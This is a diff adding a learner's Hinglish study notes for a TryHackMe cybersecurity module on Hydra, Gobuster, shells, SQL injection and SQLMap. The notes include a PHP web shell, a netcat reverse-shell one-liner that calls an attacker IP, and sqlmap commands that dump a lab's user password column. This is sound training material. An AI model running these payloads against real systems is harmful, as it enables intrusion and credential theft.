@@ -1,0 +1,1350 @@
+# TryHackMe — Cyber Security 101
+
+## Module 9 — Complete Notes
+
+> **Learning style:** Concept → Syntax → Command → Explanation → Workflow → Important points
+
+---
+
+# PART 1 — HYDRA
+
+## 1. What is Hydra?
+
+**Hydra** ek online password-cracking / authentication-testing tool hai.
+
+Iska use authorized lab mein login services ke against different username/password combinations test karne ke liye hota hai.
+
+Hydra multiple protocols support karta hai, jaise:
+
+* SSH
+* FTP
+* HTTP
+* SMB
+* etc.
+
+### Basic idea
+
+Agar kisi login service ke paas:
+
+```text
+Username = admin
+Password = ???
+```
+
+aur password unknown hai, Hydra wordlist ke passwords ko test kar sakta hai.
+
+---
+
+## 2. Basic Hydra Syntax
+
+```bash
+hydra [options] target service
+```
+
+Common pattern:
+
+```bash
+hydra -l username -P passwords.txt TARGET ssh
+```
+
+### Important flags
+
+| Flag | Meaning                          |
+| ---- | -------------------------------- |
+| `-l` | Single username                  |
+| `-L` | Username wordlist                |
+| `-p` | Single password                  |
+| `-P` | Password wordlist                |
+| `-t` | Number of parallel tasks/threads |
+| `-v` | Verbose output                   |
+| `-V` | Show each login attempt          |
+| `-f` | First valid login milne par stop |
+| `-s` | Custom port                      |
+
+### Remember
+
+```text
+-l = login/user
+-L = Login list
+-p = password
+-P = Password list
+```
+
+Capitalisation important hai.
+
+---
+
+# PART 2 — GOBUSTER
+
+## 1. What is Gobuster?
+
+**Gobuster** ek enumeration tool hai.
+
+Web applications mein iska use commonly:
+
+* directories
+* files
+* DNS/subdomains
+* virtual hosts
+
+discover karne ke liye hota hai.
+
+Example:
+
+Website:
+
+```text
+http://target/
+```
+
+Gobuster possible paths check kar sakta hai:
+
+```text
+/admin
+/login
+/uploads
+/backup
+```
+
+---
+
+## 2. Directory Enumeration
+
+Basic syntax:
+
+```bash
+gobuster dir -u http://TARGET -w wordlist.txt
+```
+
+### Breakdown
+
+```text
+gobuster
+    ↓
+tool
+
+dir
+    ↓
+directory enumeration
+
+-u
+    ↓
+target URL
+
+-w
+    ↓
+wordlist
+```
+
+### Important flags
+
+| Flag  | Meaning                         |
+| ----- | ------------------------------- |
+| `dir` | Directory/file enumeration mode |
+| `-u`  | Target URL                      |
+| `-w`  | Wordlist                        |
+| `-x`  | File extensions                 |
+| `-t`  | Number of threads               |
+| `-o`  | Output file                     |
+| `-q`  | Quiet mode                      |
+
+Example:
+
+```bash
+gobuster dir -u http://TARGET -w /path/wordlist.txt
+```
+
+File extensions ke saath:
+
+```bash
+gobuster dir -u http://TARGET -w wordlist.txt -x php,txt,html
+```
+
+Isse Gobuster jaise paths test karega:
+
+```text
+/index.php
+/admin.php
+/login.php
+/test.txt
+```
+
+---
+
+# PART 3 — SHELL OVERVIEW
+
+## 1. Shell kya hai?
+
+**Shell** ek interface hai jiske through hum operating system ko commands dete hain.
+
+Example:
+
+```bash
+ls
+pwd
+whoami
+```
+
+Shell command ko operating system tak pahunchata hai aur output return karta hai.
+
+---
+
+## 2. Shell ke basic commands
+
+### `pwd`
+
+```bash
+pwd
+```
+
+**Print Working Directory**
+
+Current directory batata hai.
+
+---
+
+### `ls`
+
+```bash
+ls
+```
+
+Current directory ke files/folders dikhata hai.
+
+Detailed:
+
+```bash
+ls -la
+```
+
+* `-l` = long/detailed listing
+* `-a` = hidden files bhi show
+
+---
+
+### `whoami`
+
+```bash
+whoami
+```
+
+Current user ka naam batata hai.
+
+---
+
+### `cd`
+
+```bash
+cd /directory
+```
+
+Directory change karta hai.
+
+---
+
+### `cat`
+
+```bash
+cat file.txt
+```
+
+File ka content display karta hai.
+
+---
+
+# PART 4 — WEB SHELL
+
+## 1. Web Shell kya hai?
+
+**Web shell** ek server-side script hoti hai jo web server ke through commands execute karne ki capability provide karti hai.
+
+Example PHP:
+
+```php
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+```
+
+Yahan:
+
+```text
+$_GET['cmd']
+```
+
+URL se `cmd` parameter ki value leta hai.
+
+Example concept:
+
+```text
+shell.php?cmd=whoami
+```
+
+Server PHP code execute karta hai aur command ka output response mein de sakta hai.
+
+---
+
+## 2. Web Shell ka basic flow
+
+```text
+Browser
+   ↓
+shell.php?cmd=whoami
+   ↓
+Web Server
+   ↓
+PHP executes command
+   ↓
+Command output
+   ↓
+Browser
+```
+
+### Important
+
+Web shell **browser mein command execute nahi karti**.
+
+Command **server par execute hoti hai**.
+
+---
+
+# PART 5 — REVERSE SHELL
+
+## 1. Reverse Shell kya hai?
+
+Reverse shell mein **target machine attacker ki machine se connection initiate karti hai**.
+
+Normal mental model:
+
+```text
+Attacker ← Target
+```
+
+Target attacker ko connection back karta hai.
+
+---
+
+## 2. Roles
+
+Suppose:
+
+```text
+Attacker / AttackBox
+10.49.96.76
+
+Target
+10.49.164.227
+```
+
+Reverse shell mein:
+
+```text
+Target 10.49.164.227
+        ↓
+Attacker 10.49.96.76
+```
+
+### Important memory
+
+> **Reverse shell = Target connects BACK to attacker.**
+
+---
+
+## 3. Listener
+
+Attacker side par listener:
+
+```bash
+nc -lvnp 8081
+```
+
+Breakdown:
+
+```text
+nc
+```
+
+Netcat.
+
+```text
+-l
+```
+
+Listen mode.
+
+```text
+-v
+```
+
+Verbose — connection information show karo.
+
+```text
+-n
+```
+
+DNS resolution avoid karo; IP directly use karo.
+
+```text
+-p 8081
+```
+
+Port `8081` par listen karo.
+
+---
+
+## 4. Reverse shell payload
+
+Authorized THM lab example:
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.49.96.76 8081 >/tmp/f
+```
+
+Iska overall purpose:
+
+```text
+Target
+  ↓
+shell create
+  ↓
+Netcat connection
+  ↓
+Attacker:8081
+```
+
+### Important mistake
+
+Agar target ka web application already:
+
+```text
+10.49.164.227:8081
+```
+
+par chal raha hai, iska matlab ye nahi ki tum wahan shell listener se connect karoge.
+
+Listener **attacker machine** par hona chahiye:
+
+```text
+10.49.96.76:8081
+```
+
+---
+
+# PART 6 — BIND SHELL
+
+## 1. Bind Shell kya hai?
+
+Bind shell mein **target machine khud ek port par listener start karti hai**.
+
+Then attacker target ke listener se connect karta hai.
+
+```text
+Attacker
+   ↓
+Target listener
+```
+
+### Difference
+
+Reverse:
+
+```text
+Target → Attacker
+```
+
+Bind:
+
+```text
+Attacker → Target
+```
+
+### Memory trick
+
+> **Reverse = target calls you.**
+
+> **Bind = target waits for you.**
+
+---
+
+# PART 7 — SQL INJECTION
+
+## 1. SQL kya hai?
+
+**SQL = Structured Query Language**
+
+Database ke saath data retrieve/modify karne ke liye use hoti hai.
+
+Example:
+
+```sql
+SELECT * FROM users
+WHERE username = 'John'
+AND password = 'password';
+```
+
+---
+
+## 2. SQL Injection kya hai?
+
+SQL Injection tab hoti hai jab user input ko safely handle nahi kiya jaata aur attacker ka input SQL query ka meaning change kar deta hai.
+
+Example vulnerable input:
+
+```text
+username
+password
+```
+
+Agar application directly input ko query mein concatenate kare, SQL injection possible ho sakti hai.
+
+---
+
+## 3. Important SQL concepts
+
+### `'`
+
+Single quote string ko close karne ke context mein important ho sakta hai.
+
+### `OR`
+
+Do conditions mein se koi ek true ho to overall condition true ho sakti hai.
+
+### `1=1`
+
+Always true condition.
+
+```text
+1 = 1
+```
+
+True hai.
+
+### `--`
+
+SQL comment syntax ka part.
+
+Remaining query ko comment out karne ke liye SQL injection payloads mein use ho sakta hai.
+
+---
+
+# PART 8 — SQL INJECTION TYPES
+
+SQLMap commonly different SQLi techniques identify kar sakta hai.
+
+## 1. Boolean-based Blind
+
+Application ka response TRUE/FALSE behavior ke basis par information infer ki jaati hai.
+
+```text
+TRUE  → Response A
+FALSE → Response B
+```
+
+---
+
+## 2. Error-based
+
+Database errors ko information obtain karne ke liye use kiya jaata hai.
+
+---
+
+## 3. Time-based Blind
+
+Database response mein intentional delay create karke information infer ki jaati hai.
+
+Example concept:
+
+```sql
+SLEEP(5)
+```
+
+Agar response approximately 5 seconds delay hota hai, SQLMap us behavior ko analyze kar sakta hai.
+
+---
+
+## 4. UNION-based
+
+`UNION` SQL queries ke results ko combine karne ke concept par based hota hai.
+
+---
+
+# PART 9 — SQLMAP
+
+## 1. SQLMap kya hai?
+
+**SQLMap** SQL Injection detection aur exploitation ko automate karne wala tool hai.
+
+Manual SQL Injection testing ke comparison mein SQLMap bahut saare tests automatically perform kar sakta hai.
+
+> Use only on systems where you have permission — THM lab is authorized practice.
+
+---
+
+# 2. SQLMap Basic Syntax
+
+```bash
+sqlmap -u 'URL'
+```
+
+### `-u`
+
+Target URL specify karta hai.
+
+Example:
+
+```bash
+sqlmap -u 'http://TARGET/page?id=1'
+```
+
+---
+
+# 3. `--help`
+
+```bash
+sqlmap --help
+```
+
+SQLMap ke available options/flags ki help show karta hai.
+
+---
+
+# 4. `--wizard`
+
+```bash
+sqlmap --wizard
+```
+
+Interactive beginner-friendly mode.
+
+SQLMap step-by-step questions poochta hai.
+
+---
+
+# 5. GET Parameter ke saath SQLMap
+
+Example:
+
+```text
+http://site.com/search?cat=1
+```
+
+Yahan:
+
+```text
+cat
+```
+
+GET parameter hai.
+
+SQLMap:
+
+```bash
+sqlmap -u 'http://site.com/search?cat=1'
+```
+
+---
+
+# 6. `--dbs`
+
+```bash
+sqlmap -u 'URL' --dbs
+```
+
+### Meaning
+
+Database names enumerate karo.
+
+```text
+--dbs
+   ↓
+databases
+```
+
+**Important:**
+
+`--dbs` database ka actual data nahi nikaalta.
+
+Ye database **names** dikhata hai.
+
+---
+
+# 7. `-D`
+
+```bash
+-D database_name
+```
+
+Specific database select karta hai.
+
+Example:
+
+```bash
+sqlmap -u 'URL' -D ai --tables
+```
+
+Meaning:
+
+> `ai` database ke andar tables enumerate karo.
+
+---
+
+# 8. `--tables`
+
+```bash
+--tables
+```
+
+Selected database ke tables enumerate karta hai.
+
+Example:
+
+```bash
+sqlmap -u 'URL' -D ai --tables
+```
+
+Output:
+
+```text
+Database: ai
+
++------+
+| user |
++------+
+```
+
+Meaning:
+
+```text
+Database
+   ↓
+ai
+
+Table
+   ↓
+user
+```
+
+---
+
+# 9. `-T`
+
+```bash
+-T table_name
+```
+
+Specific table select karta hai.
+
+Example:
+
+```bash
+-D ai -T user
+```
+
+Meaning:
+
+> `ai` database ki `user` table select karo.
+
+### IMPORTANT
+
+```text
+-D = Database
+-T = Table
+```
+
+Capital `T` important hai.
+
+---
+
+# 10. `--columns`
+
+```bash
+sqlmap -u 'URL' -D ai -T user --columns
+```
+
+Selected table ke **column names** enumerate karta hai.
+
+Concept:
+
+```text
+ai
+ ↓
+user
+ ↓
+columns
+ ↓
+email
+username
+password
+...
+```
+
+---
+
+# 11. `--dump`
+
+```bash
+--dump
+```
+
+Selected table ke **records/data** retrieve/dump karne ke liye use hota hai.
+
+Example:
+
+```bash
+sqlmap -u 'URL' -D ai -T user --dump
+```
+
+Meaning:
+
+> `ai` database → `user` table → uske records/data retrieve karo.
+
+---
+
+# 12. `-C`
+
+```bash
+-C column_name
+```
+
+Specific column select karta hai.
+
+Example:
+
+```bash
+sqlmap -u 'URL' -D ai -T user -C password --dump
+```
+
+Meaning:
+
+> `user` table ke `password` column ka data dump karo.
+
+---
+
+# 13. `--level`
+
+Example:
+
+```bash
+--level=5
+```
+
+SQLMap ko more extensive/deeper testing karne deta hai.
+
+THM ke current lab mein simple scan se results na milne par:
+
+```bash
+--level=5
+```
+
+use karne ko kaha gaya tha.
+
+---
+
+# 14. Cookies
+
+Authenticated application ke saath testing mein cookie provide ki ja sakti hai:
+
+```bash
+--cookie="SESSIONID=value"
+```
+
+`--cookie` = HTTP cookie send karo.
+
+---
+
+# 15. Saved HTTP Request
+
+POST request ya complete intercepted request ko file mein save karke:
+
+```bash
+-r request.txt
+```
+
+use kiya ja sakta hai.
+
+Example:
+
+```bash
+sqlmap -r request.txt
+```
+
+### `-r`
+
+`request` file use karo.
+
+---
+
+# 16. SQLMap Complete Enumeration Flow
+
+Ye **sabse important flow** hai:
+
+```text
+TARGET URL
+    ↓
+SQL Injection test
+    ↓
+--dbs
+    ↓
+Database names
+    ↓
+-D DATABASE --tables
+    ↓
+Tables
+    ↓
+-T TABLE --columns
+    ↓
+Columns
+    ↓
+--dump
+    ↓
+Records / Data
+```
+
+Example structure:
+
+```bash
+sqlmap -u 'URL' --dbs
+```
+
+Then:
+
+```bash
+sqlmap -u 'URL' -D ai --tables
+```
+
+Then:
+
+```bash
+sqlmap -u 'URL' -D ai -T user --columns
+```
+
+Then:
+
+```bash
+sqlmap -u 'URL' -D ai -T user --dump
+```
+
+Specific column:
+
+```bash
+sqlmap -u 'URL' -D ai -T user -C password --dump
+```
+
+---
+
+# PART 10 — MODULE 9 PRACTICAL: LOGIN SQLi
+
+THM lab URL:
+
+```text
+http://10.48.173.86/ai/login
+```
+
+Login request ka actual GET URL:
+
+```text
+http://10.48.173.86/ai/includes/user_login?email=test&password=test
+```
+
+Important:
+
+**SQLMap ko login page `/ai/login` nahi, actual request URL dena tha.**
+
+---
+
+## Why?
+
+Login page:
+
+```text
+/ai/login
+```
+
+sirf page hai.
+
+Actual request:
+
+```text
+/includes/user_login?email=test&password=test
+```
+
+mein parameters hain:
+
+```text
+email
+password
+```
+
+SQLMap in parameters ko test karta hai.
+
+---
+
+# PART 11 — THM LAB COMMANDS
+
+## SQLi detection
+
+```bash
+sqlmap -u 'http://10.48.173.86/ai/includes/user_login?email=test&password=test' --level=5
+```
+
+---
+
+## Databases
+
+```bash
+sqlmap -u 'http://10.48.173.86/ai/includes/user_login?email=test&password=test' --dbs --level=5
+```
+
+---
+
+## Tables
+
+```bash
+sqlmap -u 'http://10.48.173.86/ai/includes/user_login?email=test&password=test' -D ai --tables --level=5
+```
+
+---
+
+## Columns
+
+```bash
+sqlmap -u 'http://10.48.173.86/ai/includes/user_login?email=test&password=test' -D ai -T user --columns --level=5
+```
+
+---
+
+## Dump table
+
+```bash
+sqlmap -u 'http://10.48.173.86/ai/includes/user_login?email=test&password=test' -D ai -T user --dump --level=5
+```
+
+---
+
+# PART 12 — SQLMap Output jo humne dekha
+
+SQLMap ne identify kiya:
+
+```text
+Parameter: email (GET)
+```
+
+Meaning:
+
+> `email` parameter vulnerable hai.
+
+SQLMap ne multiple injection techniques identify ki:
+
+```text
+boolean-based blind
+error-based
+time-based blind
+```
+
+Backend:
+
+```text
+MySQL >= 5.0
+MariaDB fork
+```
+
+Web server:
+
+```text
+Apache 2.4.53
+```
+
+Database:
+
+```text
+ai
+```
+
+Table:
+
+```text
+user
+```
+
+So mental map:
+
+```text
+Web Server
+   ↓
+Apache
+
+Database System
+   ↓
+MySQL / MariaDB
+
+Database
+   ↓
+ai
+
+Table
+   ↓
+user
+
+Columns
+   ↓
+?
+
+Records
+   ↓
+?
+```
+
+---
+
+# PART 13 — SQLMap Common Problems
+
+## `no column(s) found`
+
+Example:
+
+```text
+[WARNING] no column(s) found
+```
+
+Meaning:
+
+> SQLMap table ke column names retrieve nahi kar pa raha.
+
+Try:
+
+```bash
+--columns
+```
+
+THM lab mein SQLMap common column existence check bhi suggest kar sakta hai.
+
+---
+
+## `--no-cast`
+
+SQLMap kabhi-kabhi suggest kar sakta hai:
+
+```bash
+--no-cast
+```
+
+Ye SQLMap ke casting behavior ko change karta hai.
+
+---
+
+## `--hex`
+
+SQLMap data ko hexadecimal representation ke through retrieve karne ki koshish kar sakta hai:
+
+```bash
+--hex
+```
+
+Ye normal first-choice flag nahi hai; problem aane par SQLMap suggest kar sakta hai.
+
+---
+
+# PART 14 — IMPORTANT FLAGS CHEAT SHEET
+
+## Hydra
+
+```text
+-l    → single username
+-L    → username wordlist
+-p    → single password
+-P    → password wordlist
+-t    → parallel tasks
+-v    → verbose
+-V    → show attempts
+-f    → stop after finding valid login
+-s    → custom port
+```
+
+---
+
+## Gobuster
+
+```text
+dir   → directory mode
+-u    → URL
+-w    → wordlist
+-x    → extensions
+-t    → threads
+-o    → output file
+-q    → quiet
+```
+
+---
+
+## Netcat / Shell
+
+```text
+-l    → listen
+-v    → verbose
+-n    → no DNS resolution
+-p    → port
+```
+
+---
+
+## SQLMap
+
+```text
+-u          → URL
+-r          → request file
+--help      → help
+--wizard    → interactive mode
+--dbs       → database names
+-D          → database
+--tables    → tables
+-T          → table
+--columns   → columns
+-C          → column
+--dump      → records/data
+--cookie    → HTTP cookie
+--level=5   → deeper testing
+--no-cast   → disable casting
+--hex       → hexadecimal retrieval
+```
+
+---
+
+# PART 15 — ONE-LINE MEMORY MAP
+
+```text
+HYDRA
+→ Login/password testing
+
+GOBUSTER
+→ Hidden directories/files discover
+
+SHELL
+→ OS commands interact
+
+WEB SHELL
+→ Web server ke through commands
+
+REVERSE SHELL
+→ Target → Attacker
+
+BIND SHELL
+→ Attacker → Target
+
+SQL INJECTION
+→ Input changes SQL query
+
+SQLMAP
+→ SQLi testing/exploitation automation
+```
+
+---
+
+# PART 16 — MOST IMPORTANT THINGS TO REMEMBER
+
+### Shell
+
+> Shell = OS ko commands dene ka interface.
+
+### Reverse Shell
+
+> Target connection **back** attacker ko karta hai.
+
+### Bind Shell
+
+> Target listener start karta hai; attacker usse connect karta hai.
+
+### Gobuster
+
+> Hidden web paths/resources enumerate karta hai.
+
+### Hydra
+
+> Login authentication ko wordlists ke through test karta hai.
+
+### SQL Injection
+
+> Improperly handled input SQL query ka behavior change kar sakta hai.
+
+### SQLMap
+
+> SQL Injection testing ko automate karta hai.
+
+### SQLMap chain
+
+```text
+-u
+ ↓
+--dbs
+ ↓
+-D DB --tables
+ ↓
+-T TABLE --columns
+ ↓
+--dump
+```
+
+### SQLMap flags ka easiest memory
+
+```text
+-D = Database
+-T = Table
+-C = Column
+
+--dbs = Databases
+--tables = Tables
+--columns = Columns
+--dump = Data
+```
+
+---
+
+# FINAL MODULE 9 MAP
+
+```text
+              MODULE 9
+                  │
+     ┌────────────┼────────────┐
+     ↓            ↓            ↓
+   HYDRA       GOBUSTER       SHELLS
+     │            │             │
+ Login test   Enumeration    Web Shell
+                               │
+                         ┌─────┴─────┐
+                         ↓           ↓
+                    Reverse       Bind
+                      Shell        Shell
+                         │
+                         ↓
+                  SQL INJECTION
+                         │
+                         ↓
+                       SQLMap
+                         │
+              ┌──────────┴──────────┐
+              ↓                     ↓
+            Manual              Automated
+           concepts              testing
+                                    │
+                                    ↓
+                  DB → Tables → Columns → Data
+```
+
+## Module 9 Core Revision
+
+**Hydra:** authentication testing
+**Gobuster:** enumeration
+**Shell:** command interface
+**Web Shell:** web-accessible command execution
+**Reverse Shell:** target connects back
+**Bind Shell:** target listens
+**SQLi:** SQL query manipulation through unsafe input
+**SQLMap:** SQLi automation
+**`--dbs`:** databases
+**`-D`:** database
+**`--tables`:** tables
+**`-T`:** table
+**`--columns`:** columns
+**`-C`:** column
+**`--dump`:** records/data
